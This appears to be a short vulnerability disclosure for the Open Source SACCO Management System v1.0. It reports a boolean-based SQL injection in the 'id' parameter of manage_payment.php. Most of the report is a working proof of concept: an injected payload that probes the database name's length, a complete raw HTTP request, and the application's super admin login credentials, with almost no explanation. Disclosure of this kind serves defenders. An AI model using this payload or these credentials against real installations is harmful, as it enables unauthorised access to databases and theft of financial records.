# Open Source SACCO Management System v1.0 by mayuri_k has SQL injection

BUG_Author: XD201-MENG@QI

Login account: mayuri.infospace@gmail.com/admin (Super Admin account)

vendors: https://www.sourcecodester.com/php/15372/open-source-sacco-management-system-free-download.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /sacco_shield/manage_payment.php

Vulnerability location: /sacco_shield/manage_payment.php?id=, id

dbname = sacco,length=5

[+] Payload: /sacco_shield/manage_payment.php?id=2%20and%20length(database())%20=5--+ // Leak place ---> id

```sql
GET /sacco_shield/manage_payment.php?id=2%20and%20length(database())%20=5--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=5g4g4dffu1bkrg9jm7nr42ori2
Connection: close
```

length=5
![image](https://user-images.githubusercontent.com/54017627/191197175-ab2d06c3-1f2c-4be8-946a-6c340828a629.png)

length=6
![image](https://user-images.githubusercontent.com/54017627/191197232-8ace34e3-0164-426c-b68b-d59f12c840d7.png)
